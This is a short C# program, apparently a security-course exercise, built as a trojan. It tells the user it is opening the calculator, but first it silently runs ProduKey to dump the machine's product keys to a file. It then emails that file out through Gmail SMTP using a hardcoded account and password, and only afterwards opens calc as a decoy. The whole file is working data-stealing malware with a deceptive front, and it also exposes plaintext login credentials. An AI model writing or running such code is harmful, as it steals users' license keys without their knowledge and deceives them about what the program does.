using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace TP
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Abriendo calculadora. Por favor espere...");
            List<string> files = new List<string>();

            files.Add(Helpers.openProduKey());

            Helpers.sendMail("Prueba", "Estoy probando", files);
            Helpers.openCalc();
        }
    }

    class Helpers
    {
        public static void openCalc()
        {
            System.Diagnostics.Process.Start("calc");
        }

        public static string openProduKey()
        {
            string file = "hola.txt";
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ProduKey.exe");
            startInfo.Arguments = @"/stext " + file;
            Process.Start(startInfo);
            return file;
        }

        public static void sendMail(string subject, string message, List<string> files)
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("seginf2019@gmail.com");
            mail.To.Add("seginf2019@gmail.com");
            mail.Subject = subject;
            mail.Body = message;

            foreach (var file in files)
            {
                var attachment = new System.Net.Mail.Attachment(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, file));
                mail.Attachments.Add(attachment);
            }

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("seginf2019@gmail.com", "sonrisita");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
        }
    }
}
